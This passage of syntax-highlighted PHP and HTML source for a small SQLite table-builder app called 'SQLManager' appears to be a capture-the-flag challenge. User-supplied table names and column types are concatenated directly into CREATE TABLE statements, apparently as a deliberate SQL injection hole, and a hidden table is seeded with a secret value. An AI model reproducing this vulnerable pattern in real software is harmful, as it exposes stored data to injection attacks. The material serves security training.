  <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"SELECT name FROM sqlite_master WHERE type='table' AND name &lt;> '"</span> <span class="token punctuation">.</span> tableName <span class="token punctuation">.</span> <span class="token string">"' LIMIT 1;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$tName</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">FETCH_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"PRAGMA table_info(`{$tName}`);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$cName</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetchAll</span><span class="token punctuation">(</span><span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">FETCH_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string">'modify'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$method</span> <span class="token operator">===</span> <span class="token string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$values</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'values'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"INSERT INTO `{$tName}` VALUES (?"</span> <span class="token punctuation">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">',?'</span><span class="token punctuation">,</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$cName</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">")"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$values</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'?page=index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string">'build'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$method</span> <span class="token operator">===</span> <span class="token string">'POST'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'table_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'columns'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'Parameters missing.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token variable">$tName</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'table_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$ccc</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'columns'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'.db'</span><span class="token punctuation">;</span>
  <span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string">'sqlite:db/'</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$tName</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'表不合法'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$tName</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span> <span class="token operator">||</span> <span class="token number">32</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$tName</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'表不合法'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token number">10</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'列不合法'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"CREATE TABLE {$tName} ("</span><span class="token punctuation">;</span>
  <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"example1 TEXT, example2 TEXT"</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$column</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$column</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'列不合法'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$column</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token number">32</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$column</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token number">32</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'列不合法'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">', '</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"`$column` $type"</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">');'</span><span class="token punctuation">;</span>

  <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'CREATE TABLE `'</span> <span class="token punctuation">.</span> tableName <span class="token punctuation">.</span> <span class="token string">'` (`'</span> <span class="token punctuation">.</span> columnName <span class="token punctuation">.</span> <span class="token string">'` TEXT);'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'INSERT INTO `'</span> <span class="token punctuation">.</span> tableName <span class="token punctuation">.</span> <span class="token string">'` VALUES ("'</span> <span class="token punctuation">.</span> ans <span class="token punctuation">.</span> <span class="token string">'");'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
  <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'?page=index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string">'remove'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$_SESSION</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'?page=index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string">'index'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM `{$tName}`;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$stmt</span> <span class="token operator">===</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$_SESSION</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'?page=index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetchAll</span><span class="token punctuation">(</span><span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">FETCH_NUM</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span>
<span class="token markup"><span class="token doctype">&lt;!doctype html></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>style.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://code.jquery.com/jquery-3.4.1.min.js<span class="token punctuation">"</span></span> <span class="token attr-name">integrity</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo<span class="token punctuation">=</span><span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>SQLManager<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">background</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>show.jpg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>SQLManager<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token delimiter">?></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>info<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>信息 <span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token variable">$message</span> <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string">'index'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token delimiter">?></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token delimiter">?></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token function">e</span><span class="token punctuation">(</span><span class="token variable">$tName</span><span class="token punctuation">)</span> <span class="token delimiter">?></span> <span class="token punctuation">(</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>?page<span class="token punctuation">=</span>remove<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>删表<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>?page<span class="token punctuation">=</span>modify<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token markup">&lt; count($cName); $i++) { ?></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token function">e</span><span class="token punctuation">(</span><span class="token variable">$cName</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token markup">&lt; count($result); $i++) { ?></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token markup">&lt; count($result[$i]); $j++) { ?></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token function">e</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token markup">&lt; count($cName); $i++) { ?></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>values[]<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Insert values<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token delimiter">?></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></span>建表<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>?page<span class="token punctuation">=</span>build<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>info<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span><span class="token punctuation">></span></span></span>表名 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>table_name<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>table_name<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>输入表名<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span><span class="token punctuation">></span></span></span>列数 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>number<span class="token punctuation">"</span></span> <span class="token attr-name">min</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">max</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>num<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>next<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Next<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>table<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">></span></span></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>Name<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>Type<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>
